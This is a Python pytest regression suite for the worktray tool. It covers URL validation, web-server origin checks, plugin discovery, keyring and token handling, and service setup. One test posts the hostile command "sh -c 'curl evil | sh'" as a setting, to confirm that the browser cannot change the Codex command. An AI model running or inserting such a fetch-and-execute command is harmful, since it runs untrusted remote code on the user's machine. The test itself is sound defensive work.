"""Regression tests for the findings of the pre-release review: one test or more per fix."""

import asyncio
from importlib.metadata import EntryPoint
import json
import os
from pathlib import Path
import socket

from fastapi.testclient import TestClient
import httpx
from keyring.errors import PasswordDeleteError
import pytest

from worktray import cli, paths, service
from worktray.auth import interactive, keyring_store
from worktray.auth.google_login import check_google
from worktray.config import SOURCES_ENV, enabled_key, set_source_enabled, web_url
from worktray.engine import Engine, shift_now
from worktray.models import Batch, Item, SourceState, now
from worktray.sources import codex, registry, streams, teamcity, upstream
from worktray.sources.atlassian import JIRA_URL, atlassian_config
from worktray.sources.bitbucket import bkt_api
from worktray.sources.errors import NotConnectedError, SignInRequired, SourceError
from worktray.sources.registry import Source, discover, is_available
from worktray.store import Store
from worktray.web.app import create_app

ORIGIN = {"Origin": "http://localhost"}
PR = "https://github.com/example-org/app/pull/12"


async def empty() -> Batch:
    return Batch()


def app_client(store: Store, sources: dict[str, Source] | None = None) -> TestClient:
    sources = sources if sources is not None else registry.registry()
    return TestClient(create_app(store, Engine(store, {name: empty for name in sources}, sources)), base_url="http://localhost")


# URLs


@pytest.mark.parametrize("url", ["http://localhost.example.com", "http://127.0.0.1.example.com", "https://user@acme.atlassian.net", "https://", "ftp://acme.example.com", "https://acme .example.com"])
def test_web_url_refuses_look_alike_and_unsafe_urls(url):
    with pytest.raises(ValueError):
        web_url(url)


@pytest.mark.parametrize("url", ["https://acme.atlassian.net", "http://localhost:8080", "http://127.0.0.1:2990/jira", "http://[::1]:8111"])
def test_web_url_accepts_https_and_this_machine(url):
    assert web_url(url + "/") == url


def test_links_to_a_jira_on_this_machine_are_kept():
    item = Item(key="jira:A-1", title="Local", source="jira", url="http://127.0.0.1:2990/jira/browse/A-1")

    assert item.url.startswith("http://127.0.0.1")


def test_links_to_a_look_alike_host_are_refused():
    with pytest.raises(ValueError):
        Item(key="x", title="Bad", source="jira", url="http://localhost.example.com/browse/A-1")


def test_exported_value_is_checked_like_a_saved_one(store, monkeypatch):
    monkeypatch.setenv(JIRA_URL.env, "http://jira.example.com")

    with pytest.raises(SourceError, match="WORKTRAY_JIRA_URL"):
        JIRA_URL.read(store)


def test_settings_page_shows_an_invalid_exported_value_instead_of_failing(store, monkeypatch):
    monkeypatch.setenv(JIRA_URL.env, "http://jira.example.com")

    jira = next(source for source in app_client(store).get("/api/config").json()["sources"] if source["name"] == "jira")
    field = next(field for field in jira["settings"] if field["key"] == "jira_url")

    assert field["locked"] and "https" in field["problem"]


# The web server


def test_requests_for_another_host_name_are_refused(store):
    client = TestClient(create_app(store, Engine(store, {})), base_url="http://testserver")

    assert client.get("/api/state").status_code == 400


def test_the_codex_command_cannot_be_changed_from_the_browser(store):
    response = app_client(store).post("/api/config/slack", json={"settings": {"codex_command": "sh -c 'curl evil | sh'"}}, headers=ORIGIN)

    assert response.status_code == 403 and store.setting("codex_command") == ""


def test_the_codex_command_can_be_set_from_the_terminal(store, capsys):
    with pytest.raises(SystemExit) as stopped:
        cli.main(["config", "set", "codex_command", "/opt/codex/bin/codex --profile work"])

    assert stopped.value.code == 0 and Store(paths.database()).setting("codex_command") == "/opt/codex/bin/codex --profile work"


def test_saving_the_team_scope_with_jira_off_keeps_it_for_later(store):
    set_source_enabled(store, "jira", False)

    response = app_client(store).post("/api/settings", json={"team_jql": 'project = "WEB"'}, headers=ORIGIN)

    assert response.status_code == 200 and response.json()["started"] == [] and store.setting("team_jql") == 'project = "WEB"'


# Sources start off


def test_a_first_start_has_every_source_off(fresh_store):
    engine = Engine(fresh_store, {name: empty for name in registry.registry()})

    assert engine.active() == [] and engine.due() == []


def test_saving_a_source_s_settings_switches_it_on(fresh_store):
    app_client(fresh_store).post("/api/config/github", json={"settings": {"github_orgs": "acme"}}, headers=ORIGIN)

    assert fresh_store.setting(enabled_key("github")) == "on"


def test_saving_blank_fields_does_not_switch_a_source_on(fresh_store):
    app_client(fresh_store).post("/api/config/github", json={"settings": {"github_orgs": ""}}, headers=ORIGIN)

    assert not fresh_store.has_setting(enabled_key("github"))


def test_saving_settings_leaves_a_source_you_turned_off_alone(fresh_store):
    set_source_enabled(fresh_store, "github", False)

    app_client(fresh_store).post("/api/config/github", json={"settings": {"github_orgs": "acme"}}, headers=ORIGIN)

    assert fresh_store.setting(enabled_key("github")) == "off"


# Codex and bkt


def test_codex_runs_outside_a_git_repository(store, monkeypatch, tmp_path):
    seen = {}

    async def fake_exec(*args, **kwargs):
        seen.update(args=args, cwd=kwargs.get("cwd"))
        Path(args[args.index("--output-last-message") + 1]).write_text('{"items": []}')

        class Process:
            returncode = 0

            async def communicate(self, data):
                return b"", b""

        return Process()

    monkeypatch.setattr(codex.shutil, "which", lambda name: "/usr/bin/codex")
    monkeypatch.setattr(codex.asyncio, "create_subprocess_exec", fake_exec)

    asyncio.run(codex.run_codex(store, "prompt", {"type": "object"}, "Test"))

    assert "--skip-git-repo-check" in seen["args"] and seen["cwd"] is not None and Path(seen["cwd"]).name.startswith("worktray-codex-")


def test_codex_command_with_broken_quotes_is_an_error_not_a_crash(store, monkeypatch):
    monkeypatch.setenv(codex.CODEX_COMMAND.env, "codex 'unfinished")

    with pytest.raises(SourceError):
        codex.codex_command(store, Path("schema.json"), Path("out.json"))


def test_bkt_uses_its_default_login_unless_a_context_is_named():
    assert bkt_api("/user", "") == ["bkt", "api", "/user", "--json"]
    assert bkt_api("/user", "work") == ["bkt", "api", "/user", "--context", "work", "--json"]


# Finished work


def test_finished_work_keeps_checking_when_one_pull_request_cannot_be_read(store, monkeypatch):
    other = "https://github.com/example-org/app/pull/13"

    async def pull(reference, organisations=()):
        if reference == PR:
            raise SourceError("gh couldn't read from the server")
        return upstream.LinkState(text="example-org/app#13 merged", finished=True)

    monkeypatch.setattr(upstream, "_github_state", pull)
    store.ingest([Item(key="slack:a", title=f"Review {PR}", source="slack", status="open"), Item(key="slack:b", title=f"Review {other}", source="slack", status="open")])

    batch = asyncio.run(upstream.read_upstream(store))

    assert "Could not check 1 GitHub link" in batch.detail
    assert {item.key: item.close_suggested for item in store.items()} == {"slack:a": False, "slack:b": True}


# Plugins


def entry(name: str, target: object, monkeypatch) -> EntryPoint:
    module = type(registry)("worktray_fake_plugin")
    module.target = target
    monkeypatch.setitem(__import__("sys").modules, "worktray_fake_plugin", module)
    return EntryPoint(name, "worktray_fake_plugin:target", registry.ENTRY_POINT_GROUP)


def plugin(name: str = "linear", **fields) -> Source:
    return Source(name, "Linear", lambda store, home: empty(), **fields)


def test_a_plugin_whose_factory_raises_is_skipped(monkeypatch):
    def broken():
        raise RuntimeError("boom")

    assert "linear" not in discover([entry("broken", broken, monkeypatch)])


@pytest.mark.parametrize(
    "bad",
    [
        plugin("Linear Issues"),
        plugin(settings=(registry.Setting("port", "Port"),)),
        plugin(settings=(registry.Setting("source_jira_enabled", "Sneaky"),)),
        plugin(settings=(registry.Setting("team_jql", "Team"),)),
        plugin(uses="nothing_by_this_name"),
    ],
)
def test_a_plugin_cannot_take_reserved_names_or_lean_on_a_missing_source(bad, monkeypatch):
    assert bad.name not in discover([entry("bad", bad, monkeypatch)])


def test_an_availability_check_that_raises_counts_as_unavailable(store):
    def broken() -> bool:
        raise ImportError("half installed")

    source = plugin(available=broken)
    engine = Engine(store, {"linear": empty}, {"linear": source})
    set_source_enabled(store, "linear", True)

    asyncio.run(engine.refresh("linear"))

    assert not is_available(source) and engine.states["linear"].state == "not_connected"
    assert app_client(store, {"linear": source}).get("/api/config").status_code == 200


# The engine


def test_a_source_that_is_no_longer_connected_drops_its_saved_result(store):
    async def signed_out() -> Batch:
        raise NotConnectedError("Not set up yet.")

    store.save_snapshot("linear", [Item(key="linear:1", title="Old", source="linear", live=True)], SourceState(source="linear", state="ok", last_success=now()))
    set_source_enabled(store, "linear", True)
    engine = Engine(store, {"linear": signed_out}, {"linear": plugin()})

    asyncio.run(engine.refresh("linear"))

    assert engine.items() == [] and "linear" not in store.snapshots()


def test_changing_a_source_s_settings_hides_its_old_result(store):
    store.save_setting("github_orgs", "acme")
    engine = Engine(store, {"github": empty})
    asyncio.run(engine.refresh("github"))

    store.save_setting("github_orgs", "other-org")

    assert engine.items() == [] and "github" not in engine.saved


def test_jira_filling_in_its_own_team_scope_is_not_a_settings_change(store):
    async def read() -> Batch:
        store.save_setting("team_jql", 'project = "WEB"')
        return Batch(items=[Item(key="jira:WEB-1", title="Work", source="jira", live=True)])

    store.save_setting("jira_url", "https://acme.atlassian.net")
    engine = Engine(store, {"jira": read})

    asyncio.run(engine.refresh("jira"))

    assert engine.states["jira"].state == "ok"


def test_banner_and_suggestions_follow_their_source_switch(store):
    store.save_setting("on_call_shift", json.dumps({"schedule": "Ops", "starts_at": "2020-01-01T00:00:00+00:00", "ends_at": "2999-01-01T00:00:00+00:00", "current": True}))
    set_source_enabled(store, "oncall", False)
    set_source_enabled(store, "cleanup", False)
    engine = Engine(store, {"oncall": empty, "cleanup": empty})

    state = engine.snapshot()

    assert (state["on_call"], state["oncall_epic"], state["suggestions"]) == (None, None, [])


def test_a_shift_that_ended_is_not_shown_and_current_is_worked_out_now():
    ended = json.dumps({"schedule": "Ops", "starts_at": "2020-01-01T00:00:00+00:00", "ends_at": "2020-01-08T00:00:00+00:00", "current": True})
    upcoming = json.dumps({"schedule": "Ops", "starts_at": "2999-01-01T00:00:00+00:00", "ends_at": "2999-01-08T00:00:00+00:00", "current": True})

    assert shift_now(ended) is None and shift_now(upcoming)["current"] is False


def test_live_items_are_annotated_with_one_connection_for_the_whole_batch(store, monkeypatch):
    items = [Item(key=f"jira:A-{number}", title="Work", source="jira", live=True) for number in range(20)]
    opened = []
    connect = store.connect
    monkeypatch.setattr(store, "connect", lambda: opened.append(1) or connect())

    store.current_live([items])

    assert len(opened) == 1


# Public Slack and Confluence


def test_public_slack_needs_a_name_but_not_jira(store):
    pytest.importorskip("fastmcp")
    from worktray.sources import public_slack

    store.save_setting("public_slack_mcp_url", "https://mcp.example.com/mcp")
    store.save_setting("public_slack_mcp_tool", "search_documents")

    with pytest.raises(NotConnectedError, match="name in Slack"):
        asyncio.run(public_slack.read_public_slack(store))


def test_confluence_finds_who_you_are_without_a_jira_sync(store, isolated, monkeypatch):
    seen = []

    def answer(request: httpx.Request) -> httpx.Response:
        if request.url.path.endswith("/user/current"):
            return httpx.Response(200, json={"accountId": "abc-123"})
        seen.append(request.url.params["cql"])
        return httpx.Response(200, json={"results": [], "_links": {}})

    real = httpx.AsyncClient
    monkeypatch.setattr(streams.httpx, "AsyncClient", lambda **kwargs: real(transport=httpx.MockTransport(answer), **kwargs))
    store.save_setting("jira_url", "https://acme.atlassian.net")
    store.save_setting("jira_email", "sam@example.com")
    isolated.write("jira_api_token", "token")

    asyncio.run(streams.read_confluence(store))

    assert seen and '"abc-123"' in seen[0]


# Sign-in


def test_google_check_asks_for_a_sign_in_when_not_connected(store):
    with pytest.raises(SignInRequired):
        asyncio.run(check_google(store))


def test_a_terminal_setup_isolates_a_source_that_crashes(store, monkeypatch, capsys):
    async def crash(store) -> str:
        raise httpx.ConnectError("no route")

    sources = {"broken": Source("broken", "Broken", lambda store, home: empty(), check=crash), "fine": Source("fine", "Fine", lambda store, home: empty())}
    monkeypatch.setattr(interactive, "registry", lambda: sources)
    monkeypatch.setattr(interactive.sys.stdin, "isatty", lambda: False)

    code = asyncio.run(interactive.run(store, ["broken", "fine"]))

    assert code == 1 and "1 ready, 1 failed" in capsys.readouterr().out


def test_a_named_source_that_is_not_set_up_fails_the_command(store, monkeypatch):
    async def missing(store) -> str:
        raise NotConnectedError("Not set up yet.")

    monkeypatch.setattr(interactive, "registry", lambda: {"jira": Source("jira", "Jira", lambda store, home: empty(), check=missing)})
    monkeypatch.setattr(interactive.sys.stdin, "isatty", lambda: False)

    assert asyncio.run(interactive.run(store, ["jira"])) == 1


def test_pressing_enter_keeps_the_default_rather_than_saving_it(store, monkeypatch):
    monkeypatch.setattr("builtins.input", lambda prompt: "")

    interactive._ask_setting(store, codex.CODEX_MODEL)

    assert store.has_setting("codex_model") and store.setting("codex_model") == "" and codex.CODEX_MODEL.read(store) == codex.CODEX_MODEL.default


def test_config_set_without_a_value_does_not_erase_the_setting(store, capsys):
    Store(paths.database()).save_setting("github_orgs", "acme")

    with pytest.raises(SystemExit) as stopped:
        cli.main(["config", "set", "github_orgs"])

    assert stopped.value.code == 2 and Store(paths.database()).setting("github_orgs") == "acme"


# Keyring


class FakeBackend:
    def __init__(self, delete_fails_with_value_left: bool = False) -> None:
        self.values: dict[tuple[str, str], str] = {}
        self.reads = 0
        self.delete_fails_with_value_left = delete_fails_with_value_left

    def get_password(self, service, name):
        self.reads += 1
        return self.values.get((service, name))

    def set_password(self, service, name, value):
        self.values[(service, name)] = value

    def delete_password(self, service, name):
        if self.delete_fails_with_value_left or (service, name) not in self.values:
            raise PasswordDeleteError("Can't delete")
        del self.values[(service, name)]


def keyring_with(backend: FakeBackend, tmp_path, monkeypatch) -> keyring_store.KeyringStore:
    monkeypatch.setattr(keyring_store.sys, "platform", "linux")
    monkeypatch.setattr(keyring_store.KeyringStore, "_backend", lambda self: backend)
    return keyring_store.KeyringStore(tmp_path)


def test_clearing_a_secret_that_was_never_saved_is_fine(tmp_path, monkeypatch):
    keyring_with(FakeBackend(), tmp_path, monkeypatch).clear("missing")


def test_a_failed_delete_that_leaves_the_value_behind_is_reported(tmp_path, monkeypatch):
    backend = FakeBackend(delete_fails_with_value_left=True)
    store = keyring_with(backend, tmp_path, monkeypatch)
    store.write("token", "value")

    with pytest.raises(SourceError):
        store.clear("token")


def test_keyring_reads_are_reused_for_a_short_while(tmp_path, monkeypatch):
    backend = FakeBackend()
    store = keyring_with(backend, tmp_path, monkeypatch)
    store.write("token", "value")

    assert [store.read("token") for _ in range(3)] == ["value"] * 3 and backend.reads == 0


def test_teamcity_does_not_touch_the_keyring_until_it_has_a_url(store, isolated, monkeypatch):
    monkeypatch.setattr(isolated, "read", lambda name: pytest.fail("read the keyring for an unconfigured source"))

    assert teamcity.teamcity_config(store)["TEAMCITY_TOKEN"] == "" and atlassian_config(store)["JIRA_API_TOKEN"] == ""


# MCP tokens


def test_a_token_is_refreshed_shortly_before_it_expires():
    from worktray.auth.mcp_tokens import refresh_due

    assert (refresh_due(1000, at=500), refresh_due(1000, at=970), refresh_due(1000, at=2000), refresh_due(None, at=2000)) == (False, True, True, False)


def test_keyring_token_store_round_trips_and_expires_entries(isolated, monkeypatch):
    from worktray.auth import mcp_tokens

    tokens = mcp_tokens.KeyringTokens()

    async def flow() -> tuple:
        await tokens.put("a", {"x": 1}, collection="c", ttl=60)
        first = await tokens.get("a", collection="c")
        later = mcp_tokens.time.time() + 120
        monkeypatch.setattr(mcp_tokens.time, "time", lambda: later)
        expired = await tokens.get("a", collection="c")
        deleted = await tokens.delete("a", collection="c")
        return first, expired, deleted

    assert asyncio.run(flow()) == ({"x": 1}, None, True)
    assert isolated.values == {}


def test_mcp_sign_in_is_kept_in_the_keyring_and_refreshed_when_stale(isolated, monkeypatch):
    # fastmcp records when the token expires; a sign-in loaded after that is refreshed before use.
    pytest.importorskip("fastmcp")
    from mcp.shared.auth import OAuthClientInformationFull, OAuthToken

    from worktray.auth import mcp_tokens
    from worktray.sources.public_slack import _oauth

    url = "https://mcp.example.com/mcp"
    first = _oauth(url, False)

    async def save_then_load() -> float | None:
        await first.token_storage_adapter.set_tokens(OAuthToken(access_token="old", refresh_token="refresh", expires_in=3600))
        await first.token_storage_adapter.set_client_info(OAuthClientInformationFull(client_id="client", redirect_uris=["http://localhost:1/callback"]))
        later = mcp_tokens.time.time() + 7200
        monkeypatch.setattr(mcp_tokens.time, "time", lambda: later)
        second = _oauth(url, False)
        await second._initialize()
        return second.context.token_expiry_time

    expiry = asyncio.run(save_then_load())

    assert all(name.startswith("mcp:") for name in isolated.values) and isolated.values
    assert expiry == 1.0
    assert not (paths.oauth_dir() / "fastmcp").exists()


# Paths and the service


def test_an_empty_xdg_variable_counts_as_unset(monkeypatch):
    monkeypatch.delenv("WORKTRAY_HOME")
    monkeypatch.setattr(paths.sys, "platform", "linux")
    monkeypatch.setenv("XDG_DATA_HOME", "")

    assert paths.home() == Path.home() / ".local/share/worktray"


def test_a_relative_data_folder_is_made_absolute(monkeypatch, tmp_path):
    monkeypatch.chdir(tmp_path)
    monkeypatch.setenv("WORKTRAY_HOME", "profile")

    assert paths.home() == tmp_path.resolve() / "profile" and service.environment()["WORKTRAY_HOME"] == str(tmp_path.resolve() / "profile")


def test_the_service_path_keeps_the_installing_shell_s_path(monkeypatch, tmp_path):
    monkeypatch.setenv("PATH", f"{tmp_path}{os.pathsep}/usr/bin")

    assert str(tmp_path) in service.agent_path().split(":")


def test_install_stops_when_the_port_is_taken(monkeypatch):
    monkeypatch.setattr(service, "_stop_existing", lambda: None)
    with socket.socket() as taken:
        taken.bind(("127.0.0.1", 0))
        taken.listen()
        monkeypatch.setenv("WORKTRAY_PORT", str(taken.getsockname()[1]))

        with pytest.raises(SystemExit, match="in use"):
            service.install()


def test_the_source_list_variable_still_decides(fresh_store, monkeypatch):
    monkeypatch.setenv(SOURCES_ENV, "github")

    assert Engine(fresh_store, {"github": empty, "jira": empty}).active() == ["github"]
